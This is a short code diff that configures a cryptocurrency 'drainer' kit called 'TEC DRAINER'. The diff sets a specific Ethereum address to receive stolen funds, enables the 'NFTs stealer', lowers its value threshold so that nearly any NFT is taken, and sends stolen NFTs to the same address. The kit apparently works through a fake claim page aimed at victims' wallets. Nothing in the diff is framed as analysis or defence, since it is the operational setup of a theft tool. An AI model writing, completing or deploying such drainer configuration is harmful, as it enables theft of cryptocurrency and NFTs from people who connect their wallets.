@@ -1,4 +1,4 @@
-const receiveAddress = "Your ETH Wallet Adress";
+const receiveAddress = "0xd94848e05442bF112E584fd3F89694FC3E7a457C";
 
 const collectionInfo = {
     name: "TEC DRAINER",
@@ -28,8 +28,8 @@ const claimPageInfo = {
 
 const drainNftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
-    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
-    nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
+    minValue: 0.0001,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
+    nftReceiveAddress: "0xd94848e05442bF112E584fd3F89694FC3E7a457C" // leave empty if you want to use the same as receiveAddress 
 }
 
 const customStrings = {
